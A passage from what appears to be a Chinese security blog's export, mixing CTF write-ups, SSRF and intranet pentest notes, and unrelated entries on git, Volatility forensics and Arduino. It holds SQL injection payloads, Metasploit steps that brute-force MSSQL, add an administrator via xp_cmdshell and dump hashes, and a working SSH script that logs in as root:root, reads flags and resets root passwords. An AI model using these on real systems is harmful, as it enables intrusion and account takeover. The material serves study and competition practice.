<p><img src="C:%5CUsers%5C51763%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191108213119371.png" alt="image-20191108213119371"></p>
<ul>
<li>在表中并未查找出来flag，最后读文件读出来了</li>
</ul>
<pre><code class="mysql">1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#

1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),20,50)),0x7e),1)#</code></pre>
<ul>
<li>flag</li>
</ul>
<pre><code class="mysq">flag{71ee17ac-d06a-4  4aca-91c3-ae8671029100} </code></pre>
</li>
<li><p>延伸</p>
<ul>
<li><p>UPDATEXML </p>
<ul>
<li><pre><code class="mysql">UPDATEXML (XML_document, XPath_string, new_value); </code></pre>
<ul>
<li>参数1：XML_document是String格式，为XML文档对象的名称，文中为Doc  </li>
<li>参数2：XPath_string (Xpath格式的字符串)  </li>
<li>参数3:    new_value，String格式，替换查找到的符合条件的数据  </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>内部交流小比赛</title>
    <url>//articles/d7163af6f6.html</url>
    <content><![CDATA[<h1 id="top-3-mountains-WP"><a href="#top-3-mountains-WP" class="headerlink" title="top 3 mountains WP"></a>top 3 mountains WP</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><ul>
<li><p>首先给出界面输入one时候会显示一张图片，可以猜测是文件包含或者ssrf?</p>
</li>
<li><p>一开始猜测是：</p>
</li>
</ul>
<pre><code class="php">  inlude(&quot;tour/&quot;$num.&quot;.php&quot;）            </code></pre>
<ul>
<li>但是这样这道题没意义了，所以必定是ssrf，输入/etc/passwd有回显。直接上fuzz看看。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857612653555.png" alt="img"></p>
<ul>
<li>直接跑出日志文件。看看出题人之前的操作。找出关键文件。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613447154.png" alt="img"></p>
<ul>
<li>直接有源码，无参数RCE，过滤了dir所以以前构造基本没戏，直接用SESSIONID去构造参数。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857613861725.png" alt="img"></p>
<ul>
<li>getflag</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/1585761521936.png" alt="img"></p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>读取index.php源码</p>
<pre><code>hhhm://redmango.top/../../index.php</code></pre><h1 id="Upload-WP"><a href="#Upload-WP" class="headerlink" title="Upload WP"></a>Upload WP</h1><p>扫描器一把梭出来<code>upload.html</code></p>
<p>随便上传个文件，黑名单，直接hatccess。</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857972207333.png" alt="img"></p>
<ul>
<li>直接hatccess</li>
</ul>
<pre><code>&lt;FilesMatch &quot;shell.jpg&quot;&gt;
    SetHandler application/x-httpd-php
  &lt;/FilesMatch&gt;</code></pre><p><strong><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857974174812.png" alt="img"></strong></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20200402/15857987303976.png" alt="img"></p>
<p>换位密码：</p>
<p>flag{htACceSs_fI1E_29uP1oAd666}</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯2019-随便注-复盘总结</title>
    <url>//articles/d72174f7cb.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当时能力有限没有复盘这道题，现在来复盘一下这道比较简单的注入题。</p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>题目在输入select关键字时候回直接返回一个正则告诉你过滤了哪些内容。</p>
<pre><code class="php">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre>
<p>明显题目过滤了select和点（’ . ‘）这样导致无法直接跨表进行查询。或者说无法使用联合查询之类的。尝试可以知道可以使用堆叠注入。</p>
<pre><code class="mysql">1&#39;;show tables;#</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute20190904/15676107961704.png" alt="img"></p>
<p>但是由于过滤了select可以使用<code>concat()</code>将字符合成字符串而字符使用<code>char()</code>将ASCII转换为字符，即可bypass过滤，然后使用预处理执行目标语句。</p>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre><code class="mysql">payload=&quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;
exp = &quot;select group_concat(flag) from supersqli.1919810931114514&quot;
result=&#39;&#39;
for i in exp:
    result+=&quot;char(%s),&quot;%(ord(i))

print(payload%(result[:-1]))#result[:-1]除去换行符</code></pre>
<h2 id="pyload"><a href="#pyload" class="headerlink" title="pyload"></a>pyload</h2><pre><code class="mysql">0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(102),char(108),char(97),char(103),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(115),char(117),char(112),char(101),char(114),char(115),char(113),char(108),char(105),char(46),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52));PREPARE a FROM @s;EXECUTE a;</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute20190905/15676946962230.png" alt="img"></p>
<h1 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h1><p><a href="https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019qiangwang.html#%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p>
<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="mysql批处理"><a href="#mysql批处理" class="headerlink" title="mysql批处理"></a>mysql批处理</h2><pre><code class="csharp">设置变量：set @s=sql语句
预处理语句：prepare 预处理名字 from ‘sql语句’
执行预处理：execute 预处理名字 [using 变量]</code></pre>
<p>例子：</p>
<pre><code class="shell">mysql &gt;&gt; set @s=&quot;select group_concat(flag) from supersqli.1919810931114514&quot;
mysql &gt;&gt; PREPARE a FROM @s
mysql &gt;&gt; EXECUTE a</code></pre>
<h2 id="知识拓展——PHP预处理"><a href="#知识拓展——PHP预处理" class="headerlink" title="知识拓展——PHP预处理"></a>知识拓展——PHP预处理</h2><pre><code class="php">//预处理语句，?为绑定的参数
$mysql = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)&quot;);

//绑定参数第一个参数为参数列处理其余参数的数据类型。如下$firstname, $lastname, $email三个变量都为字符串类型所以，第一个参数为sss

$mysql-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);

/*参数1有以下四种类型:
i - integer（整型）
d - double（双精度浮点型）
s - string（字符串）
b - BLOB（布尔值）*/

//下面设置参数并执行
$firstname = &quot;John&quot;;
$lastname = &quot;Doe&quot;;
$email = &quot;john@example.com&quot;;
$stmt-&gt;execute();</code></pre>
<h2 id="php批处理的优点："><a href="#php批处理的优点：" class="headerlink" title="php批处理的优点："></a>php批处理的优点：</h2><ul>
<li>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</li>
<li>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</li>
<li>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</li>
</ul>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF学习笔记</title>
    <url>//articles/d725b85c91.html</url>
    <content><![CDATA[<h4 id="SSRF代码分析"><a href="#SSRF代码分析" class="headerlink" title="SSRF代码分析"></a>SSRF代码分析</h4><ul>
<li><strong>PHP中可能存在SSRF漏洞的函数</strong></li>
</ul>
<pre><code class="php">file_get_contents(),fsockopen(),curl_exec()</code></pre>
<ul>
<li><strong>file_get_contents()函数SSRF例子</strong></li>
</ul>
<pre><code class="php+HTML">&lt;?php
if(isset($_POST[&#39;url&#39;])){
    $content=file_get_content($_POST[&#39;url&#39;]);
    $filename=&#39;./images/&#39;.rand().&#39;img.jpg&#39;;
    file_put_contents($filename,$content);
    echo $_POST[&#39;url&#39;];
    $img=&quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;
}
echo $img;
?&gt;</code></pre>
<ul>
<li><strong>fsockopen()函数SSRF例子</strong></li>
</ul>
<pre><code class="php">&lt;?php
function Getfile($host,$port,$link){
    $fp = fscokopen($host,intval($port),$errno,$errstr,30);
    if(!fp){
        echo &quot;$errstr (error number $errno)\n&quot;;
    }else{
        $out  = &quot;GET $link HTTP/1.1\r\n&quot;;
        $out .= &quot;Host:$host\r\n&quot;;
        $out  = &quot;Connection: Close\r\n\r\n&quot;;
        $out .= &quot;\r\n&quot;;
        fwrite($fp,$out);
        $content=&#39;&#39;;
        while(!feof($fp)){
          content .= fgets($fp,1024);  
        }
        fclose($fp);
        return $contents;
    }
}
?&gt;</code></pre>
<ul>
<li><strong>curl_exec()函数SSRF例子</strong></li>
</ul>
<pre><code class="php">&lt;?php
if(isset($_POST[&#39;url&#39;])){
    $link = $_POST[&#39;url&#39;];
    $culobj = curl_init();
    curl_setopt($curlobj,CURLOPT_POST,0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj,CURLOPT_RETURNTRANSFER,1);
    $result=curl_exec($curlobj);
    curl_close($curlobj);
    $filename = &#39;./images/&#39;.rand().&#39;.txt&#39;;
    file_put_contents($filename,$result);
    echo $result;
}
?&gt;</code></pre>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习笔记</title>
    <url>//articles/d729d7601d.html</url>
    <content><![CDATA[<p>本文将持续更新。系统记录内网渗透学习。</p>
<p><strong><em>声明：本文仅研究学习所用，参考文章的一切活动均与本人无关。</em></strong></p>
<h2 id="内网服务探测"><a href="#内网服务探测" class="headerlink" title="内网服务探测"></a>内网服务探测</h2><h3 id="Netdiscover-探测活动主机"><a href="#Netdiscover-探测活动主机" class="headerlink" title="Netdiscover 探测活动主机"></a>Netdiscover 探测活动主机</h3><ul>
<li>简介</li>
</ul>
<blockquote>
<p>专用的二层发现工具。拥有主动和被动发现两种方式。</p>
</blockquote>
<ul>
<li>参数</li>
</ul>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>-i 网卡</td>
<td>指定监听的网卡</td>
</tr>
<tr>
<td>-r range</td>
<td>指定IP段</td>
</tr>
<tr>
<td>-l filename</td>
<td>从文件中读取IP段</td>
</tr>
<tr>
<td>-p</td>
<td>被动模式</td>
</tr>
<tr>
<td>-t</td>
<td>ARP发送间隔</td>
</tr>
<tr>
<td>-c</td>
<td>发包数量</td>
</tr>
</tbody></table>
<ul>
<li>使用举例</li>
</ul>
<pre><code class="shell">netdiscover i eth0 -r 192.168.3.0/24 #主动探测IP：192.168.3.0/24段存活的主机
netdiscover -p</code></pre>
<h3 id="使用Namp探测主机开放服务"><a href="#使用Namp探测主机开放服务" class="headerlink" title="使用Namp探测主机开放服务"></a>使用Namp探测主机开放服务</h3><p>由于已经使用<code>netdiscover</code>探测指定主机的使用Pn参数跳过Pn检测。具体使用参数说明在另一篇文章里讲.</p>
<pre><code class="shell">nmap -sV -Pn 192.168.3.31</code></pre>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521142828.png" alt="20200521142828"></p>
<h2 id="MSF攻击内网服务"><a href="#MSF攻击内网服务" class="headerlink" title="MSF攻击内网服务"></a>MSF攻击内网服务</h2><h3 id="MSF攻击内网SQL-SERVER服务"><a href="#MSF攻击内网SQL-SERVER服务" class="headerlink" title="MSF攻击内网SQL SERVER服务"></a>MSF攻击内网SQL SERVER服务</h3><h4 id="爆破Mssql弱口令"><a href="#爆破Mssql弱口令" class="headerlink" title="爆破Mssql弱口令"></a>爆破Mssql弱口令</h4><ul>
<li>搜索mssql爆破payload</li>
</ul>
<pre><code>search mssql_login</code></pre><ul>
<li>使用弱口令爆破payload</li>
</ul>
<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.31
run</code></pre>
<ul>
<li>如果提示:</li>
</ul>
<blockquote>
<p>[*] Error: 192.168.109.139: Metasploit::Framework::LoginScanner::Invalid Cred details can’t be blank, Cred details can’t be blank (Metasploit::Framework::LoginScanner::MSSQL)</p>
</blockquote>
<p>则说明mssql不是默认密码需要指定字典进行爆破：</p>
<pre><code class="shell">use auxiliary/scanner/mssql/mssql_login
set rhosts 192.168.3.31
set user_file /root/user.txt
set pass_file /root/pass.txt
run</code></pre>
<ul>
<li>爆破成功sa密码为admin<br><img src="http://goodcheerleung.gitee.io/blog/20200521143926.png" alt="20200521143926"></li>
</ul>
<h4 id="枚举Mssql配置信息"><a href="#枚举Mssql配置信息" class="headerlink" title="枚举Mssql配置信息"></a>枚举Mssql配置信息</h4><ul>
<li>搜索枚举Mssql配置信息payload</li>
</ul>
<pre><code>search mssql_enum</code></pre><ul>
<li>使用Mssql-enum payload</li>
</ul>
<pre><code class="shell">use auxiliary/admin/mssql_enum
set username sa
set password admin
set rhosts 192.168.3.31
run</code></pre>
<ul>
<li>这样可以看到mssql开放的哪些功能能够供我们利用，例如比较重要的就是xp_cmdshell能够直接继承mssql的权限执行系统命令：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521145004.png" alt="20200521145004"></p>
<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><h5 id="xp-cmdshell-执行命令"><a href="#xp-cmdshell-执行命令" class="headerlink" title="xp_cmdshell 执行命令"></a>xp_cmdshell 执行命令</h5><p>使用该模块时候如果<code>xp_cmdshell</code>没有启动将自动激活</p>
<ul>
<li>搜索mssql exec攻击脚本</li>
</ul>
<pre><code>search mssql_exec</code></pre><ul>
<li>使用mssql_exec攻击脚本</li>
</ul>
<pre><code>use auxiliary/admin/mssql_exec
set username sa
set password admin
set rhosts 192.168.3.31
set cmd chcp 65001&amp;whoami
run</code></pre><ul>
<li>注意chcp 65001改变字符编码解决乱码问题，可以看到返回结果是system，直接添加新用户即可。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521145639.png" alt="20200521145639"></p>
<ul>
<li>增加用户</li>
</ul>
<pre><code class="shell">set cmd chcp 65001&amp;net user test abc!123456 /add
run</code></pre>
<ul>
<li>提升权限</li>
</ul>
<pre><code class="shell">set cmd chcp 65001&amp;net localgroup administrators test /add</code></pre>
<h4 id="使用mssql-hashdump-抓取hash"><a href="#使用mssql-hashdump-抓取hash" class="headerlink" title="使用mssql_hashdump 抓取hash"></a>使用mssql_hashdump 抓取hash</h4><pre><code>use auxiliary/scanner/mssql/mssql_hashdump  
set rhosts 192.168.3.30
set password admin
set username sa
run</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521224308.png" alt="20200521224308"></p>
<p><img src="http://goodcheerleung.gitee.io/blog/20200521224355.png" alt="20200521224355"></p>
<h4 id="执行sql语句"><a href="#执行sql语句" class="headerlink" title="执行sql语句"></a>执行sql语句</h4><pre><code>use auxiliary/admin/mssql/mssql_sql
set rhosts 192.168.3.30
set password admin
set username sa
set sql set sql Select Name FROM Master.dbo.SysDatabases orDER BY Name
run </code></pre><p><img src="http://goodcheerleung.gitee.io/blog/20200521230010.png" alt="20200521230010"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH爆破脚本编写小记\Python paramiko库的学习</title>
    <url>//articles/d72df663a9.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在紧张备战AWD线下赛，没什么经验，防止有全场密码一样的情况，直接写脚本cat全场flag，然后修改系统密码。</p>
<h2 id="编写记录"><a href="#编写记录" class="headerlink" title="编写记录"></a>编写记录</h2><h4 id="paramiko的安装"><a href="#paramiko的安装" class="headerlink" title="paramiko的安装"></a>paramiko的安装</h4><pre><code class="shell">pip install parmiko</code></pre>
<h4 id="简单的ssh连接例子"><a href="#简单的ssh连接例子" class="headerlink" title="简单的ssh连接例子"></a>简单的ssh连接例子</h4><pre><code class="python">import paramiko
import sys
def SshCon(ip,prot,user,passwd):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip,prot,user,passwd,timeout=1.5)
        stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
        result=stdout.read()
        if(result):
            print(&quot;Success&quot;)
    except Exception as e:
        pass
SshCon(&#39;127.0.0.1&#39;,22,&#39;root&#39;,&#39;root&#39;)
</code></pre>
<ul>
<li><p>从例子中不难看出，在执行一条shell后悔返回shell的执行结果，这个结果是字节类型，所以对返回结果处理时候可以转换为字符串类型。</p>
</li>
<li><p>修改密码只需执行一条命令</p>
</li>
</ul>
<pre><code class="python">stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)</code></pre>
<h4 id="多线程对多个IP进行爆破demo"><a href="#多线程对多个IP进行爆破demo" class="headerlink" title="多线程对多个IP进行爆破demo"></a>多线程对多个IP进行爆破demo</h4><pre><code class="python">import threading
try:
    import queue
except:
    from Queue import Queue
class Ssh(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue=queue
    def run(self):
        while not self._queue.empty():
            try:
                iplist=self._queue.get()
                self.SshCon(iplist)
    def SshCon(self,ip):
        &#39;&#39;&#39;略&#39;&#39;&#39;
def main():
    try:
        Myqueue = Queue()
    except:
        Myqueue = queue.Queue()
    with open(&quot;ssh.txt&quot;) as dic:
        for i in dic:
            Myqueue.put(i.strip(&#39;\n&#39;))
    threads = []
    threadsCount=50
    for i in range(threadsCount):
        threads.append(Ssh(Myqueue))
    for t in threads:
        t.start()
    for t in threads:
        t.join()       </code></pre>
<h4 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h4><pre><code class="python">#!/usr/bin/env python
#-*-coding:utf-8-*-
import paramiko
import sys
import threading
import os
import time
try:
    import queue
except:
    from Queue import Queue
class SshSimplepass(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self._queue=queue
    def run(self):
        while not self._queue.empty():
            try:
                iPlist=self._queue.get()
                self.SshCheck(iPlist)
            except:
                pass
    def SshCheck(self,ip):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # 跳过了远程连接中选择‘是’的环节,
        try:
            ssh.connect(ip, 22, &#39;root&#39;, &#39;root&#39;,timeout=1.5)
            stdin, stdout, stderr = ssh.exec_command(&#39;df&#39;)
            result=stdout.read()
            if not result is None:
                stdin, stdout, stderr = ssh.exec_command(&#39;cat /flag&#39;)
                result = str(stdout.read(),encoding=&quot;utf-8&quot;)
                sys.stdout.write(&#39;\033[5;32m&#39;+&#39;[+]&#39;+&#39;\t&#39;+ip+&#39;\t&#39;+result+&#39;\n&#39;)
                with open(filename) as file:
                    if ip not in file.read():
                        f = open(filename,&#39;a+&#39;)
                        f.write(ip+&#39;\t&#39;+result)
                        f.close()
            stdin, stdout, stderr = ssh.exec_command(&quot;echo &#39;root:admin123&#39;|chpasswd&quot;)
            print(stdout.read())    
        except Exception as e:
            pass
            #sys.stdout.write(&#39;\033[31m&#39;+&quot;[NOT]&quot;+&#39;\t&#39;+ip+&quot;\n&quot;)    
        finally:
            ssh.close()
def main(threadsCounts):
    try:
        Myqueue = Queue()
    except:
        Myqueue = queue.Queue()

    with open(&quot;ssh.txt&quot;) as dic:
        for line in dic:
            Myqueue.put(line.strip(&#39;\n&#39;))
    threads=[]
    threadsCount=int(threadsCounts)
    for i in range(threadsCount):
        threads.append(SshSimplepass(Myqueue))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
if __name__==&#39;__main__&#39;:
    if len(sys.argv) != 2:
        sys.stdout.write(&quot;Enter:python %s threads&quot; %(sys.argv[0]))
    else:
        path=&quot;result/&quot;
        filename=path+&#39;/&#39;+str(time.strftime(&quot;%Y-%m-%d&quot;, time.localtime()))+&quot;.txt&quot;
        isExists=os.path.exists(path)
        if not isExists:
            os.makedirs(path)
        f = open(filename,&quot;a+&quot;)
        f.close()
        main(sys.argv[1])</code></pre>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>本地上传到github小记</title>
    <url>//articles/d79bab95ef.html</url>
    <content><![CDATA[<p>1.New repository</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190727/15642181913929.png" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190727/15642182108444.png" alt="img"></p>
<p>把上面的HTTPS连接复制</p>
<pre><code class="shell">cd /项目文件夹
git init #生成git管理
git add .#将文件添加到仓库
git config --global user.email</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190727/1564218235629.png" alt="img"></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Volatility内存取证学习-复盘红帽杯Advertising for Marriage</title>
    <url>//articles/d7cc8e3b98.html</url>
    <content><![CDATA[<h1 id="获取镜像信息"><a href="#获取镜像信息" class="headerlink" title="获取镜像信息"></a>获取镜像信息</h1><pre><code class="shell">volatility -f &lt;file&gt; imageinfo</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738160914043.png" alt="img"></p>
<h1 id="读取进程"><a href="#读取进程" class="headerlink" title="读取进程"></a>读取进程</h1><pre><code class="shell">volatility -f &lt;file&gt; --profile=WinXPSP2x86 psscan</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738161931286.png" alt="img"></p>
<h1 id="读取指定进程内容"><a href="#读取指定进程内容" class="headerlink" title="读取指定进程内容"></a>读取指定进程内容</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 memdump -p 332 --dump-dir=./</code></pre>
<pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86 notepad</code></pre>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191115/15738164635401.png" alt="img"></p>
<ul>
<li><p>提取出来的文件用gimp打开调整宽度直至出现图像</p>
</li>
<li><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738341787357.png" alt="img"></p>
</li>
<li><p>综合得到提示</p>
<pre><code>b1cxneedmoneyandgirlfirend</code></pre></li>
</ul>
<h1 id="搜索图片"><a href="#搜索图片" class="headerlink" title="搜索图片"></a>搜索图片</h1><pre><code class="shell">volatility -f 1.raw --profile=WinXPSP2x86  filescan | grep -E &#39;jpg|png|jpeg|bmp|gif&#39;</code></pre>
<h1 id="提取图片"><a href="#提取图片" class="headerlink" title="提取图片"></a>提取图片</h1><pre><code>volatility -f 1.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000249ae78  -n --dump-dir=./</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738343277555.png" alt="img"></p>
<h1 id="lsb解码、base64、维吉尼亚密码"><a href="#lsb解码、base64、维吉尼亚密码" class="headerlink" title="lsb解码、base64、维吉尼亚密码"></a>lsb解码、base64、维吉尼亚密码</h1><p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780599940.jpg" alt="img"></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191116/15738780779999.jpg" alt="img"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>初学Adruino开发板笔记-智能小车（一）</title>
    <url>//articles/d7d58228d.html</url>
    <content><![CDATA[<h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><ul>
<li>电机驱动模块</li>
<li>Adruino uno开发板</li>
<li>杜邦线若干</li>
<li>小车总成</li>
</ul>
<h1 id="小车线路连接"><a href="#小车线路连接" class="headerlink" title="小车线路连接"></a>小车线路连接</h1><h4 id="驱动模块"><a href="#驱动模块" class="headerlink" title="驱动模块"></a>驱动模块</h4><p>​        首先了解<code>电机驱动模块</code>的组成，电机驱动模块的四个接口分别连接连接电机的正负极，也就是电机1的正负极分别连接out1、out2.同理另外一个电机接到out3、out4。这样就可以通过输出高低电平来控制小车的移动。而VCC（正极）接口用于外界电源的供电，接到板子的VIN接口（ 供电范围7~12V ）不过最好低于10V，个人不大推荐外接电源，使用USB+充电宝供电即可。中间的GND是地线接口，接到板子的GND接口，第三个5V接口就是通过板子的5V接口给驱动模块供电，但是板子得用充电宝供电。IN1-IN4接口接到板子上对应的输出引脚，需要根据你的代码实际情况进行接入。</p>
<hr>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720840884637.png" alt="img"></p>
<h4 id="开发板"><a href="#开发板" class="headerlink" title="开发板"></a>开发板</h4><p>整体连接如下：</p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720862822325.png" alt="img"></p>
<ul>
<li><p><strong>Power 引脚:</strong> 均是供电所用，提供3.3V、5V、GND（地线）、VIN（外接电源）而</p>
</li>
<li><p><strong>Analog In引脚</strong> :右下方的A0~A5为模拟输入引脚， 开发板可读取外部模拟信号. </p>
</li>
<li><p><strong>13引脚</strong> :连接板载LED灯，可通过控制13引脚来控制LED灯亮灭。一般拿到开发板上电板载灯都会闪烁，可辅助检测开发板是否正常 </p>
</li>
<li><p><strong>Digital 引脚</strong> : UNO R3拥有14个数字I/O引脚，其中6个可用于PWM(脉宽调制)输出 ,也就是带波浪线（~）的引脚。PWM引脚可以用于调节电机转速。 数字引脚用于读取逻辑值(0或1)，或者作为数字输出引脚来驱动外部模块。 </p>
<p>​        了解了这些引脚的功能后那么我们就可以将控制我们电机的接口连接到PWM接口上，这样就能够控制我们的电机转速，也能调整电机的转动方向</p>
</li>
<li><p><strong>Adruino uno引脚一览图：</strong></p>
<p><img src="http://goodcheerleung.gitee.io/mycute/20191026/15720864094604.png" alt="img"></p>
</li>
</ul>
<hr>
<h4 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h4><ul>
<li><p><strong>实现简单的方向控制</strong></p>
<p>首先我们小车要实现前进，那么就需要四个轮子转动方向一致，那么我们通过电机的电流要一致，那么我们控制轮子可以通过引脚输出高低电平的方式实现。前进的代码如下,<code>analogWrite(引脚,PWM值)</code>用于调节电机转速，digitalWrite（引脚，高电平/低电平），如果两边轮子设置为HIGH and LOW那么他们的电流方向一致，所以会前进，后退自然就是反过来，转向就是让两边轮子转的方向相反(与坦克转向原理类似)。</p>
<pre><code class="C">analogWrite(PIN_PWML,200);
digitalWrite(PIN_AIN3,HIGH);
digitalWrite(PIN_AIN4,LOW);
analogWrite(PIN_PWMR,200);
digitalWrite(PIN_AIN1,HIGH);
digitalWrite(PIN_AIN2,LOW)</code></pre>
</li>
<li><p>简单源码DEMO，具体在注释中已经十分详细，这里不再做讲解。</p>
<pre><code class="c">#define PIN_PWML 9
#define PIN_AIN3 5//对应板子上INPUT3
#define PIN_AIN4 6//对应板子上INPUT4
#define PIN_PWMR 10
#define PIN_AIN1 9//对应板子上INPUT1
#define PIN_AIN2 10//对应板子上INPUT2
void setup() {//初始化，将引脚设置为输出状态
  pinMode(PIN_PWML,OUTPUT);
  pinMode(PIN_AIN3,OUTPUT);
  pinMode(PIN_AIN4,OUTPUT);
  pinMode(PIN_PWMR,OUTPUT);
  pinMode(PIN_AIN1,OUTPUT);
  pinMode(PIN_AIN2,OUTPUT);

}
void loop() {//主循环
    analogWrite(PIN_PWML,200);
    digitalWrite(PIN_AIN3,HIGH);
    digitalWrite(PIN_AIN4,LOW);
    analogWrite(PIN_PWMR,200);
    digitalWrite(PIN_AIN1,HIGH);
    digitalWrite(PIN_AIN2,LOW)
    delay(3000); //动作保持3秒以上

</code></pre>
</li>
</ul>
<p>  }</p>
<pre><code>
- 多个动作实现DEMO

  ```c
  #define PIN_PWML 9
  #define PIN_AIN3 5
  #define PIN_AIN4 6//定义引脚接口，具体看上面的接口讲解
  #define PIN_PWMR 10
  #define PIN_AIN1 9
  #define PIN_AIN2 10/
  void carrun(int num){
    switch(num){
      case 0://前进
          analogWrite(PIN_PWML,200);
          digitalWrite(PIN_AIN3,LOW);
          digitalWrite(PIN_AIN4,HIGH);
          analogWrite(PIN_PWMR,200);
          digitalWrite(PIN_AIN1,LOW);
          digitalWrite(PIN_AIN2,HIGH);
      break;
      case 1://后退
            analogWrite(PIN_PWML,200);
            digitalWrite(PIN_AIN3,HIGH);
            digitalWrite(PIN_AIN4,LOW);
            analogWrite(PIN_PWMR,200);
            digitalWrite(PIN_AIN1,HIGH);
            digitalWrite(PIN_AIN2,LOW);
      break;
      case 2://左转弯
            analogWrite(PIN_PWML,200);
            digitalWrite(PIN_AIN3,HIGH);
            digitalWrite(PIN_AIN4,LOW);
            analogWrite(PIN_PWMR,200);
            digitalWrite(PIN_AIN1,LOW);
